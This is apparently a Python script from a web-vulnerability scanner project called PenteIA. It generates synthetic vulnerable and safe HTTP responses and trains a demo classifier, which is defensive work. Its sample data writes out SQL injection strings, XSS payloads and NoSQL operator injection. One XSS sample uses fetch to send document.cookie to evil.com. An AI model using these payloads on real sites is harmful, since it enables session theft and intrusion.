#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Cria um modelo de DEMONSTRAÇÃO do PenteIA rapidamente.

Gera um pequeno conjunto de dados sintéticos (respostas HTTP vulneráveis e seguras)
e treina o mesmo pipeline scikit-learn usado em produção, salvando em
modelos/penteia_model.joblib. Útil para testar o scanner sem rodar o pipeline completo.

ATENÇÃO: é um modelo de demonstração, treinado em dados sintéticos simples.
Para uso real, treine com dados do seu ambiente: python treinar_modelo_real.py
"""

import os
import sys
import json
import random

import pandas as pd

# Garante saída UTF-8 no terminal (evita erros no console do Windows / cp1252)
try:
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")
except Exception:
    pass

from treinar_modelo_real import (
    criar_diretorios, criar_pipeline, salvar_modelo,
    MODEL_DIR, MODEL_PATH, META_PATH,
)

random.seed(42)

# Trechos típicos de respostas VULNERÁVEIS (rótulo 1)
TRECHOS_VULNERAVEIS = {
    "sqli": [
        "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version near ''' at line 1",
        "Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given",
        "Query: SELECT * FROM users WHERE id='{p}'\nResults: id, username, password\n1, admin, 5f4dcc3b5aa765d61d8327deb882cf99",
        "UNION SELECT user,password FROM users -- executado. admin:5f4dcc3b5aa765d61d8327deb882cf99",
        "SQLSTATE[42000]: Syntax error or access violation near '{p}'",
        "Database error: unclosed quotation mark after the character string",
    ],
    "xss": [
        "<div class=\"search-results\">Results for: <script>alert('XSS')</script></div>",
        "<input type=\"text\" value=\"<img src=x onerror=alert(document.cookie)>\" />",
        "Welcome, <svg onload=alert('XSS')>! Your profile was updated.",
        "<p>Comentário: <script>fetch('http://evil.com?c='+document.cookie)</script></p>",
    ],
    "cmd_injection": [
        "Command output:\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        "total 32\ndrwxr-xr-x 2 root root 4096 Jan 5 config.php\n-rw-r--r-- 1 root root 8138 index.php",
        "Volume in drive C is OS\n Directory of C:\\Windows\nwin.ini  system.ini",
    ],
    "nosqli": [
        "MongoDB query: db.users.find({username: {$ne: ''}})\nResults: {\"_id\":1,\"username\":\"admin\",\"role\":\"admin\"}",
        "operator $gt cannot be used here. Returned 25 documents including admin user.",
    ],
    "lfi_rfi": [
        "root:x:0:0:root:/root:/bin/bash\nbin:x:2:2:bin:/bin:/usr/sbin/nologin",
        "<?php $database_user='dbuser'; $database_pass='dbpassword123'; $secret_key='a8d4j2m9'; ?>",
        "[windows]\nload=*\nrun=*\n[MCI Extensions.BAK]",
    ],
}

# Trechos típicos de respostas SEGURAS (rótulo 0)
TRECHOS_SEGUROS = [
    "Bem-vindo ao nosso site! Por favor, faça login para continuar.",
    "Nenhum resultado encontrado para a sua busca.",
    "O produto selecionado é: Notebook Pro 15. Preço: R$ 4.999,00",
    "Login bem-sucedido. Bem-vindo de volta!",
    "Sua mensagem foi enviada com sucesso. Obrigado pelo contato.",
    "404 - Página não encontrada. Verifique o endereço digitado.",
    "Resultados da pesquisa: 12 itens encontrados na categoria Livros.",
    "Perfil atualizado. Suas preferências foram salvas.",
    "Carrinho de compras: 3 itens. Total: R$ 159,90",
    "Política de privacidade e termos de uso atualizados em 2025.",
    "Catálogo: Camiseta, Calça, Tênis, Boné. Frete grátis acima de R$ 200.",
    "Notícia: Equipe lança nova versão do aplicativo com melhorias de desempenho.",
]


def gerar_dataset_demo(n_por_classe=300):
    linhas = []
    tipos = list(TRECHOS_VULNERAVEIS.keys())

    # Vulneráveis
    for _ in range(n_por_classe):
        tipo = random.choice(tipos)
        base = random.choice(TRECHOS_VULNERAVEIS[tipo]).replace("{p}", "' OR 1=1--")
        ruido = f" [req-{random.randint(1000,9999)}] "
        texto = f"HTTP/1.1 200 OK\nContent-Type: text/html\n\n{ruido}{base}"
        linhas.append({"text": texto, "label": 1, "tipo_payload": tipo})

    # Seguros
    for _ in range(n_por_classe):
        base = random.choice(TRECHOS_SEGUROS)
        ruido = f" [req-{random.randint(1000,9999)}] "
        texto = f"HTTP/1.1 200 OK\nContent-Type: text/html\n\n{ruido}{base}"
        linhas.append({"text": texto, "label": 0, "tipo_payload": "normal"})

    random.shuffle(linhas)
    return pd.DataFrame(linhas)


def main():
    print("\n==== PenteIA - Criação de Modelo de Demonstração ====\n")
    criar_diretorios()

    print("[*] Gerando dataset sintético de demonstração...")
    df = gerar_dataset_demo()
    print(f"[+] {len(df)} exemplos gerados (50% vulneráveis / 50% seguros)")

    pipeline = criar_pipeline()
    print("[*] Treinando modelo de demonstração...")
    pipeline.fit(df["text"].astype(str).tolist(), df["label"].astype(int).tolist())

    salvar_modelo(pipeline, acc=1.0, n_amostras=len(df))

    # Marca como modelo de demonstração nos metadados
    try:
        with open(META_PATH, "r", encoding="utf-8") as f:
            meta = json.load(f)
        meta["version"] = "3.0-sklearn-demo"
        meta["demo"] = True
        meta["accuracy"] = None
        with open(META_PATH, "w", encoding="utf-8") as f:
            json.dump(meta, f, indent=4, ensure_ascii=False)
    except Exception:
        pass

    # Marcador de modelo demo
    with open(os.path.join(MODEL_DIR, ".demo_model"), "w", encoding="utf-8") as f:
        f.write("modelo de demonstracao\n")

    print(f"\n✅ Modelo de demonstração criado em {MODEL_PATH}")
    print("   Teste o scanner com:")
    print("   python scanner.py --url http://localhost/DVWA/ --auth auth_dvwa.json")
    print("\n   Para um modelo real, treine com seus dados: python treinar_modelo_real.py")


if __name__ == "__main__":
    main()
